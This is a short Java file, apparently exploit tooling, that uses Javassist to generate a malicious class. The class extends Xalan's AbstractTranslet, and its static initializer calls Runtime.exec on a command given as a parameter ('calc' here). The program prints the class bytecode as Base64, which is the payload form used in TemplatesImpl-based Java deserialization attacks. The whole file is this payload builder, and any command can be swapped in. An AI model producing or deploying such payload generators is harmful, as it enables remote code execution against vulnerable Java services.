package com.idiot9;

import javassist.*;

import java.io.IOException;
import java.util.Base64;

public class ByteCodeGen{
    public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException {
        byte[] bytes = genByte("calc");
        String s = Base64.getEncoder().encodeToString(bytes);
        System.out.println(s);
    }

    public static byte[] genByte(String cmd) throws NotFoundException, CannotCompileException, IOException {
        ClassPool pool = ClassPool.getDefault();
        CtClass sink = pool.makeClass("Sink");
        CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        sink.setSuperclass(superClass);
        CtConstructor static_block = sink.makeClassInitializer();
        static_block.setBody("Runtime.getRuntime().exec(\""+cmd+"\");");
        return sink.toBytecode();
    }
}
